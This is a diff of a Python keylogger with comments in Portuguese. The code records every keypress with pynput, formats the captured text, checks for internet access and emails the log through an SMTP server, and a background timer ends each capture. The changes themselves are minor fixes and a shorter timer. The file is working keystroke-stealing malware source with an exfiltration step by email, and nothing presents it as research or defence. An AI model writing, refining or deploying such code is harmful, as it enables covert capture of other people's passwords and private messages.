@@ -8,7 +8,6 @@ import threading
 import ctypes
 import datetime
 
-
 teclado = Controller()  # Controlador de teclado
 letras_sem_formatar = []  # Variável que irá armazenar todas as letras pressionadas
 letras_formatadas = []  # Váriavel que irá armazenar as letras formatadas para serem concatenadas antes de enviar
@@ -35,9 +34,11 @@ def tecla_pressionada(tecla):
             tecla = str(tecla).replace("'", "")
             tecla = str(tecla).replace("[", "")
             tecla = str(tecla).replace("]", "")
+
             if verificar_capslock():
                 print(f"A tecla pressionada foi {tecla.upper()}")
                 letras_sem_formatar.append(tecla.upper())
+
             else:
                 print(f"A tecla pressionada foi {tecla}")
                 letras_sem_formatar.append(tecla)
@@ -71,17 +72,17 @@ def formatar_letras(letras):
                 letras_formatadas.append("\n")
             elif letra.capitalize() == "Key.tab":
                 letras_formatadas.append("    ")
-            elif letra.capitalize() == "Key.shift" or letra == "Key.shift_r":
+            elif letra.capitalize() == "Key.shift" or letra.capitalize() == "Key.shift_r":
                 pass
             elif letra.capitalize() == "Key.caps_lock":
                 pass
-            elif letra.capitalize() == "Key.ctrl_l" or letra == "Key.ctrl_r":
+            elif letra.capitalize() == "Key.ctrl_l" or letra.capitalize() == "Key.ctrl_r":
                 pass
             elif letra.capitalize() == "Key.menu":
                 pass
-            elif letra.capitalize() == "Key.alt_l" or letra == "Key.alt_gr":
+            elif letra.capitalize() == "Key.alt_l" or letra.capitalize() == "Key.alt_gr":
                 pass
-            elif letra.capitalize() == "Key.f1" or letra == "Key.f2" or letra == "Key.f3" or letra == "Key.f4" or letra == "Key.f5" or letra == "Key.f6" or letra == "Key.f7" or letra == "Key.f8" or letra == "Key.f9" or letra == "Key.f10" or letra == "Key.f11" or letra == "Key.f12":
+            elif letra.capitalize() == "Key.f1" or letra.capitalize() == "Key.f2" or letra.capitalize() == "Key.f3" or letra.capitalize() == "Key.f4" or letra.capitalize() == "Key.f5" or letra.capitalize() == "Key.f6" or letra.capitalize() == "Key.f7" or letra.capitalize() == "Key.f8" or letra.capitalize() == "Key.f9" or letra.capitalize() == "Key.f10" or letra.capitalize() == "Key.f11" or letra.capitalize() == "Key.f12":
                 pass
             elif letra.capitalize() == "Key.cmd":
                 pass
@@ -197,7 +198,7 @@ def formatar_letras(letras):
                     else:
                         letras_formatadas.append("A")
                 else:
-                    letras_formatadas.append("a")
+                    letras_formatadas.append("A")
 
             elif letra == "e":
                 if len(letras_formatadas) > 0:
@@ -428,12 +429,14 @@ def conexao_internet():
     try:
         # Tentar fazer uma requisição com algum servidor online
         requisicao = requests.get("https://www.google.com")
+
         if requisicao.status_code == 200:
             # Retorna True se a solicitação estiver OK
             return True
         else:
             # Retorna False se a solicitação NÃO estiver OK
             return False
+
     except (requests.ConnectionError, requests.exceptions.MissingSchema):
         # Apresentar a mensagem de erro se a conexão falhar
         print("Não foi possível se conectar ao servidor")
@@ -454,11 +457,11 @@ def enviar_email():
     DESTINATARIO = USUARIO
 
     # Mensagem para enviar
-    assunto_mensagem = "Log"
+    assunto_mensagem = f"Log: {data_atual}"
     mensagem = mensagem_final
 
     # Configurando servidor smtp
-    servidor_smtp = "smtp.servidor.com"  # Use um servidor que tenha autenticação apenas com e-mail e senha
+    servidor_smtp = "smtp.servidor.com"
     porta_smtp = 587  # A porta padrão da Lib também funciona, que é a 25, mas a 587 é mais comumente usada
 
     try:
@@ -505,8 +508,8 @@ def cronometro():
     global cronometro_finalizou
     # Cronômetro inicia em segundo plano, enquanto captura as teclas
     # Caso queria mudar alterar o valor do temporizador e do range do loop
-    temporizador = 60
-    for t in range(60):
+    temporizador = 5
+    for t in range(5):
         temporizador -= 1
         sleep(1)
 
@@ -517,6 +520,7 @@ def cronometro():
     teclado.release(Key.esc)
 
 
+# Iniciando o cronômetro em outra Thread (segundo plano)
 cronometro_finalizou = False
 threading.Thread(target=cronometro).start()
 
